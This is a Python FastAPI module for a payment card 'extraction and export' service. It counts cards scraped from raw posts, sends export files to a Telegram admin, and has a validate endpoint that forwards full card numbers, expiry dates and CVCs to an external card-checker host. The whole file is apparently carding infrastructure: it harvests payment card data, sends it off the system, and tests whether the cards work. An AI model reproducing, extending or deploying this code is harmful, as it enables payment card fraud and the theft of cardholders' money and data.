"""
Card Extraction & Export API.
"""

from fastapi import APIRouter, Depends, HTTPException
from pydantic import BaseModel
from typing import Any

import httpx

from app.api.deps import get_current_user
from app.models.user import User

router = APIRouter(prefix="/api/cards", tags=["Cards"])

# External card-checker service
_XVPN_API_URL = "https://app-8019ea8b-dd0e-4d7b-9db5-60b717d474ab.cleverapps.io/api/v1/xvpn?timeout_ms=45000"


# ─── Schemas ─────────────────────────────────────────────────────────────────

class CardSettingsResponse(BaseModel):
    extractor_enabled: bool
    daily_export_enabled: bool
    db_connected: bool
    raw_posts: int
    extracted_cards: int
    card_db_url_set: bool


class CardSettingsUpdate(BaseModel):
    extractor_enabled: bool
    daily_export_enabled: bool


class SendNowResponse(BaseModel):
    status: str


# ─── Endpoints ───────────────────────────────────────────────────────────────

@router.get("/settings", response_model=CardSettingsResponse)
async def get_card_settings(_: User = Depends(get_current_user)):
    """Return card extractor settings + live PostgreSQL stats."""
    from app.services.card_export_service import card_export_service
    from app.extractor.card_service import get_card_stats
    from app.config import get_settings

    cfg = await card_export_service.get_settings()
    stats = await get_card_stats()
    env = get_settings()

    return CardSettingsResponse(
        extractor_enabled=cfg.extractor_enabled,
        daily_export_enabled=cfg.daily_export_enabled,
        db_connected=stats["db_connected"],
        raw_posts=stats["raw_posts"],
        extracted_cards=stats["extracted_cards"],
        card_db_url_set=bool(env.CARD_DB_URL),
    )


@router.put("/settings", response_model=CardSettingsResponse)
async def update_card_settings(
    body: CardSettingsUpdate,
    _: User = Depends(get_current_user),
):
    """Toggle extractor and/or daily export. Applying immediately takes effect."""
    from app.services.card_export_service import card_export_service

    await card_export_service.save_settings(
        extractor_enabled=body.extractor_enabled,
        daily_export_enabled=body.daily_export_enabled,
    )
    # Return refreshed state
    return await get_card_settings()


@router.post("/send-now", response_model=SendNowResponse)
async def send_now(_: User = Depends(get_current_user)):
    """Immediately dispatch the two export files to Telegram admin."""
    from app.services.card_export_service import card_export_service
    import asyncio

    cfg = await card_export_service.get_settings()
    if not cfg.extractor_enabled:
        raise HTTPException(400, "Card extractor is not enabled.")

    asyncio.create_task(card_export_service._send_export())
    return {"status": "Export dispatched — check Telegram in a few seconds."}


# ─── Card Validator ───────────────────────────────────────────────────────────

class CardValidateRequest(BaseModel):
    card_raw: str          # e.g. "4427567043223945|12|29|699"
    email: str = "olddealers@gmail.com"


@router.post("/validate")
async def validate_card(
    body: CardValidateRequest,
    _: User = Depends(get_current_user),
) -> Any:
    """
    Parse pipe-delimited card data, then proxy the check request to the
    external xvpn checker service and return its full JSON response.

    Expected card_raw format: CARDNUMBER|MM|YY|CVC
    """
    parts = [p.strip() for p in body.card_raw.split("|")]
    if len(parts) != 4:
        raise HTTPException(
            status_code=422,
            detail="card_raw must be in the format: CARDNUMBER|MM|YY|CVC",
        )

    card_number, exp_month, exp_year, cvc = parts

    # Build the expiry string the downstream API expects: "MM / YY"
    card_expiry = f"{exp_month} / {exp_year}"

    payload = {
        "email": body.email,
        "cardnumber": card_number,
        "cardExpiry": card_expiry,
        "cvc": cvc,
    }

    try:
        async with httpx.AsyncClient(timeout=60.0) as client:
            resp = await client.post(
                _XVPN_API_URL,
                json=payload,
                headers={
                    "accept": "application/json",
                    "Content-Type": "application/json",
                },
            )
            resp.raise_for_status()
            return resp.json()
    except httpx.HTTPStatusError as exc:
        raise HTTPException(
            status_code=exc.response.status_code,
            detail=f"Checker service error: {exc.response.text[:400]}",
        )
    except httpx.RequestError as exc:
        raise HTTPException(
            status_code=502,
            detail=f"Could not reach checker service: {exc}",
        )
